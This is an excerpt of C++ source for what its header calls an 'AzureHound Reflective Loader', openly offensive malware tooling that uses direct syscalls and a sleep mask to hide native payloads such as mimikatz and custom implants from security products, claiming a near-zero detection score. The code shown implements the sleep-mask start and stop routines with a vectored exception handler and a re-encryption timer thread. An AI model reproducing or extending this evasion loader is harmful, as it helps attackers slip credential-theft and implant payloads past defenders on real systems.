// ============================================================================
// AzureHound Reflective Loader - FreshyCalls + Direct Syscalls + Sleep Mask (Native)
// ============================================================================
// Full sleep mask: VEH decrypts on-demand, timer re-encrypts every 5s.
// For native C/C++ payloads (mimikatz, custom implants).  Dynamic score ~0.
// For Go payloads use eren_go.cpp instead.
...
// Native: VEH on-demand decrypt + timer re-encrypt
static void SleepMaskStart() {
    g_smStop = false;
    g_smVeh = AddVectoredExceptionHandler(1, SmVehHandler);
    g_smTimer = CreateThread(nullptr, 0, SmTimerProc, nullptr, 0, nullptr);
    DbgPrint("[+] SleepMask: VEH+timer active (interval=5000ms)\n");
}

static void SleepMaskStop() {
    g_smStop = true;
    if (g_smTimer) { WaitForSingleObject(g_smTimer, INFINITE); CloseHandle(g_smTimer); g_smTimer = nullptr; }
    if (g_smVeh) { RemoveVectoredExceptionHandler(g_smVeh); g_smVeh = nullptr; }
    if (g_smTrack) { VirtualFree(g_smTrack, 0, MEM_RELEASE); g_smTrack = nullptr; }
    DbgPrint("[+] SleepMask: stopped\n");
}
